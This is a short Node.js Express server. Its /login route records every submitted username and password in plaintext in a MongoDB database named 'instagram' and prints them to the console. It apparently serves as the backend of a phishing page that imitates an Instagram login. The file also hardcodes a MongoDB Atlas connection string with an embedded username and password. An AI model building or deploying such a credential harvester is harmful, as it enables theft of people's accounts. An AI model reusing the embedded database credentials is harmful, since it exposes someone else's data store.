const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const app = express();
const PORT = 3000;

// Middleware to parse incoming requests
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (your HTML, CSS)
app.use(express.static('public'));

// MongoDB connection (use MongoDB Atlas connection string)
const mongoURI = 'mongodb+srv://mubashirkp:hDw6ET5kLQJN1Ixv@mubashir.7v1og.mongodb.net/instagram';

mongoose.connect(mongoURI)
.then(() => console.log('Connected to MongoDB Atlas'))
.catch(err => console.log('Failed to connect to MongoDB Atlas', err));

// MongoDB Schema and Model for User
const userSchema = new mongoose.Schema({
    username: { type: String, required: true, unique: true },
    password: { type: String, required: true }
});

const User = mongoose.model('User', userSchema);

// POST route for login
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Log the received data to the console (for debugging)
    console.log('Received login details:', { username, password });

    // Create a new User document and save it to MongoDB
    const newUser = new User({ username, password });

    newUser.save()
        .then(() => {
            res.send('User data saved successfully!');
        })
        .catch((error) => {
            console.error('Error saving user:', error);
            res.send('Error saving user to the database.');
        });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
